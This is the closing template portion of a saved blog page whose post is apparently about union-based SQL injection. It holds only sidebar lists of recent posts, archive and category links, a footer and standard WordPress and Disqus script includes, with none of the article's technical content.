+					<a href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/" rel="bookmark" title=""> 
+					Controlling LED brightness with a potentiometer					</a>
+					</h4>
+                    </div>
+	                </li>
+                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunionfeatured-200x160.jpg" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?resize=200%2C160 200w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=2&amp;resize=200%2C160 400w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="275" data-permalink="http://www.danieledonzelli.com/sqlunionfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="sqlunionfeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-1024x755.jpg"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">4 July, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="262 http://www.danieledonzelli.com/?p=262">0 Comments</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/" rel="bookmark" title=""> 
+					SQL Injection – Union Based					</a>
+					</h4>
+                    </div>
+	                </li>
+                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/ios/uistepper-tutorial/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/UIStepperFeature-200x160.png" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature.png?resize=200%2C160 200w, https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature.png?zoom=2&amp;resize=200%2C160 400w, https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature.png?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="258" data-permalink="http://www.danieledonzelli.com/uistepperfeature/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature.png" data-orig-size="4267,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="UIStepperFeature" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/06/UIStepperFeature-1024x768.png"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">21 June, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/ios/uistepper-tutorial/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="246 http://www.danieledonzelli.com/?p=246">0 Comments</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/ios/uistepper-tutorial/" rel="bookmark" title=""> 
+					UIStepper Tutorial					</a>
+					</h4>
+                    </div>
+	                </li>
+                                                        </ul>
+		</div><div id="archives-2" class="sb_widget  widget_archive"><h3>Archives</h3>		<ul>
+				<li><a href="http://www.danieledonzelli.com/2016/08/">August 2016</a></li>
+	<li><a href="http://www.danieledonzelli.com/2016/07/">July 2016</a></li>
+	<li><a href="http://www.danieledonzelli.com/2016/06/">June 2016</a></li>
+	<li><a href="http://www.danieledonzelli.com/2016/05/">May 2016</a></li>
+	<li><a href="http://www.danieledonzelli.com/2016/04/">April 2016</a></li>
+		</ul>
+			</div><div id="categories-2" class="sb_widget  widget_categories"><h3>Categories</h3>		<ul>
+				<li class="cat-item cat-item-3"><a href="http://www.danieledonzelli.com/category/arduino/">Arduino</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.danieledonzelli.com/category/ethical-hacking/">Ethical Hacking</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://www.danieledonzelli.com/category/ios/">iOS</a>
+</li>
+		</ul>
+			</div>    </div>
+    <div class="clearfix"></div>
+    </div>
+
+<!-- #page_content END -->
+
+</div>
+
+<div id="footer_bg" class="footer_3_col footer_type_1">
+  <div class="wrapper">
+    <div id="footer">
+	  <div class="widget_wrap">
+      <div class="widget rd_s_blog_widget"> 
+	    <h2>Recent Posts</h2><div class="sc_small_line widget_line"><span class="small_l_left"></span></div>          
+                <ul class="rd_widget_recent_entries">
+  					                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/BlindBoolFeatured-200x160.jpg" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?resize=200%2C160 200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?zoom=2&amp;resize=200%2C160 400w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="287" data-permalink="http://www.danieledonzelli.com/blindboolfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="BlindBoolFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured-1024x755.jpg"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">7 August, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="286 http://www.danieledonzelli.com/?p=286">1 Comment</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/" rel="bookmark" title=""> 
+					Blind SQL Injection – Boolean based					</a>
+					</h4>
+                    </div>
+	                </li>
+                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/PotenzFeatured-200x160.png" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?resize=200%2C160 200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?zoom=2&amp;resize=200%2C160 400w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="280" data-permalink="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/attachment/potenzfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png" data-orig-size="3264,2448" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PotenzFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured-1024x768.png"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">15 July, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="279 http://www.danieledonzelli.com/?p=279">0 Comments</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/" rel="bookmark" title=""> 
+					Controlling LED brightness with a potentiometer					</a>
+					</h4>
+                    </div>
+	                </li>
+                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/sqlunionfeatured-200x160.jpg" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?resize=200%2C160 200w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=2&amp;resize=200%2C160 400w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="275" data-permalink="http://www.danieledonzelli.com/sqlunionfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="sqlunionfeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/sqlunionfeatured-1024x755.jpg"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">4 July, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="262 http://www.danieledonzelli.com/?p=262">0 Comments</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/" rel="bookmark" title=""> 
+					SQL Injection – Union Based					</a>
+					</h4>
+                    </div>
+	                </li>
+                                                        </ul>
+		</div>            </div>
+            <div class="widget_wrap">
+            </div>
+            <div class="widget_wrap">
+      <div class="widget widget_categories"><h2>Categories</h2><div class="sc_small_line widget_line"><span class="small_l_left"></span></div>		<ul>
+				<li class="cat-item cat-item-3"><a href="http://www.danieledonzelli.com/category/arduino/">Arduino</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.danieledonzelli.com/category/ethical-hacking/">Ethical Hacking</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://www.danieledonzelli.com/category/ios/">iOS</a>
+</li>
+		</ul>
+			</div>            </div>
+          </div>
+    </div>
+
+    <div id="footer_coms">
+      <div class="wrapper">
+
+		<div class="f_menu_left m_normal">	
+            </div>
+ <div class="footer_message f_message_left">
+   
+ © 2016 Donzelli Daniele  |   All Rights Reserved  </div>
+
+
+</div>
+</div>
+</div>
+</div>
+<a id="to_top" style="bottom: -30px;"><i class="fa-angle-up"></i></a>
+
+<div id="mobile-menu">
+
+    <ul id="tf_mb_menu" class="menu"><li id="menu-item-25" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-25"><a href="http://www.danieledonzelli.com/">HOME</a></li>
+<li id="menu-item-24" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24"><a href="http://www.danieledonzelli.com/ios/">iOS</a></li>
+<li id="menu-item-23" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23"><a href="http://www.danieledonzelli.com/arduino/">ARDUINO</a></li>
+<li id="menu-item-22" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22"><a href="http://www.danieledonzelli.com/ethical-hacking/">ETHICAL HACKING</a></li>
+<li id="menu-item-21" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21"><a href="http://www.danieledonzelli.com/about/">ABOUT</a></li>
+</ul></div>
+<div class="menu_slide mt_menu sticky_header" style="position: absolute; left: 0px; width: 100%; z-index: -1; top: 0px;">
+            <div class="wrapper tf_o_visible">
+
+<div id="logo_img"><a href="http://www.danieledonzelli.com/"><img class="dark_logo mobile_logo" src="./SQL Injection - Union Based - Daniele Donzelli_files/Logo.png" alt="Daniele Donzelli" title="Daniele Donzelli" scale="0"></a></div>
+
+
+
+                
+<div id="nav_button_alt"></div>
+    </div>          
+           
+</div>
+	<div style="display:none">
+	<div class="grofile-hash-map-d8c7054979370dd03780e80e4e0f1e3b">
+	</div>
+	</div>
+<style type="text/css" media="screen"></style><script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/scrollmagic.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var zilla_likes = {"ajaxurl":"http:\/\/www.danieledonzelli.com\/wp-admin\/admin-ajax.php"};
+var zilla_likes = {"ajaxurl":"http:\/\/www.danieledonzelli.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/customjs.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/custom_woo_js.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/smoothscroll.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/photon.min.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var wpcf7 = {"apiSettings":{"root":"http:\/\/www.danieledonzelli.com\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/scripts.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var countVars = {"disqusShortname":"danieledonzelli"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/comment_count.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"262 http:\/\/www.danieledonzelli.com\/?p=262","disqusShortname":"danieledonzelli","disqusTitle":"SQL Injection \u2013 Union Based","disqusUrl":"http:\/\/www.danieledonzelli.com\/ethical-hacking\/sql-injection-union-based\/","postId":"262"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/comment_embed.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/devicepx-jetpack.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/gprofiles.js.download"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/wpgroho.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/comment-reply.min.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/wp-embed.min.js.download"></script>
+<script type="text/javascript" src="./SQL Injection - Union Based - Daniele Donzelli_files/e-201909.js.download" async="async" defer="defer"></script>
+<script type="text/javascript">
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:7.0.1',blog:'109942499',post:'262',tz:'0',srv:'www.danieledonzelli.com'} ]);
+	_stq.push([ 'clickTrackerInit', '109942499', '262' ]);
+</script>
+
+<div id="tiptip_holder" style="max-width:auto;"><div id="tiptip_arrow"><div id="tiptip_arrow_inner"></div></div><div id="tiptip_content"></div></div><img src="./SQL Injection - Union Based - Daniele Donzelli_files/g.gif" alt=":)" width="6" height="5" id="wpstats" scale="0"><iframe style="display: none;" src="./SQL Injection - Union Based - Daniele Donzelli_files/saved_resource(2).html"></iframe></body><span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span class="gr__triangle"></span></span></html>
